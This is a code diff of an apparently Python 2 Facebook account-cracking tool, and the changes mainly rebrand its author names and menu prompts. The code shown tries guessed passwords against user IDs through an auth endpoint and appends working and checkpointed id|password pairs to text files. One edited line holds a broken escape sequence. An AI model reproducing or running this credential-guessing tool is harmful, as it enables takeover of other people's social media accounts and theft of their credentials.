@@ -120,7 +120,7 @@ def log_menu():
 
 
 def log_menu_s():
-    s = raw_input(' \x1b[1;94m\xe2\x95\xb0\xe2\x94\x80ASGHAR\xe2\x9e\xa4 ')
+    s = raw_input(' \x1b[1;94m\xe2\x95\xb0\xe2\x94\x80Rana\xe2\x9e\xa4 ')
     if s == '1':
         log_fb()
     elif s == '2':
@@ -267,7 +267,7 @@ def menu():
 
 
 def menu_s():
-    ms = raw_input('\x1b[1;97m\xe2\x95\xb0\xe2\x94\x80ASGHAR\xe2\x9e\xa4 ')
+    ms = raw_input('\x1b[1;97m\xe2\x95\xb0\xe2\x94\x8Rana\xe2\x9e\xa4 ')
     if ms == '1':
         auto_crack()
     elif ms == '2':
@@ -275,7 +275,7 @@ def menu_s():
     elif ms == '3':
         name_crack()
     elif ms == '4':
-        os.system('python2 ok.py')
+        os.system('python2 NADEEM0003.py')
     elif ms == '5':
         lout()
     elif ms == '6':
@@ -337,7 +337,7 @@ def a_s():
     id = []
     cps = []
     oks = []
-    a_s = raw_input(' \x1b[1;97m\xe2\x95\xb0\xe2\x94\x80ASGHAR\xe2\x9e\xa4 ')
+    a_s = raw_input(' \x1b[1;97m\xe2\x95\xb0\xe2\x94\x80Rana\xe2\x9e\xa4 ')
     if a_s == '1':
         os.system('clear')
         print logo
@@ -424,7 +424,7 @@ def a_s():
     print ' \x1b[1;97mCrack Running\x1b[1;91m '
     time.sleep(0.5)
     print 47 * '-'
-    print '\t\x1b[1;92m{MALIK ASGHAR LATIF}\x1b[1;91m'
+    print '\t\x1b[1;92m{Rana Nadeem Rajput}\x1b[1;91m'
     print 47 * '-'
 
     def main(arg):
@@ -435,14 +435,14 @@ def a_s():
             data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass1, headers=header).text
             q = json.loads(data)
             if 'loc' in q:
-                print '\x1b[1;92m[ASGHAR-OK] \x1b[1;32m' + uid + ' | ' + pass1 + '\x1b[0;97m'
-                ok = open('/sdcard/ids/ASGHAR_OK.txt', 'a')
+                print '\x1b[1;92m[-OK] \x1b[1;32m' + uid + ' | ' + pass1 + '\x1b[0;97m'
+                ok = open('/sdcard/ids/_OK.txt', 'a')
                 ok.write(uid + ' | ' + pass1 + '\n')
                 ok.close()
                 oks.append(uid + pass1)
             elif 'www.facebook.com' in q['error']:
-                print '\x1b[1;31;1m[ASGHAR-CP] ' + uid + ' | ' + pass1
-                cp = open('ASGHAR_CP.txt', 'a')
+                print '\x1b[1;31;1m[-CP] ' + uid + ' | ' + pass1
+                cp = open('_CP.txt', 'a')
                 cp.write(uid + ' | ' + pass1 + '\n')
                 cp.close()
                 cps.append(uid + pass1)
@@ -457,7 +457,7 @@ def a_s():
                     ok.close()
                     oks.append(uid + pass2)
                 elif 'www.facebook.com' in q['error']:
-                    print '\x1b[1;31;1m[ASGHAR-CP] ' + uid + ' | ' + pass2
+                    print '\x1b[1;31;1m[-CP] ' + uid + ' | ' + pass2
                     cp = open('ASGHAR_CP.txt', 'a')
                     cp.write(uid + ' | ' + pass2 + '\n')
                     cp.close()
@@ -754,7 +754,7 @@ def c_s():
     print ' \x1b[1;97m~~~ Crack Running ~~~\x1b[1;91m'
     time.sleep(0.5)
     print 47 * '-'
-    print '\t\x1b[1;94m{MALIK ASGHAR LATIF}\x1b[1;91m'
+    print '\t\x1b[1;94m{Rana Nadeem Rajput}\x1b[1;91m'
     print 47 * '-'
 
     def main(arg):
@@ -1020,7 +1020,7 @@ def n_s():
     print ' \x1b[1;97mCrack Running\x1b[1;91m '
     time.sleep(0.5)
     print 47 * '-'
-    print '\t\x1b[1;94m{MALIK ASGHAR LATIF}\x1b[1;91m'
+    print '\t\x1b[1;94m{Rana Nadeem Rajput}\x1b[1;91m'
     print 47 * '-'
 
     def main(arg):
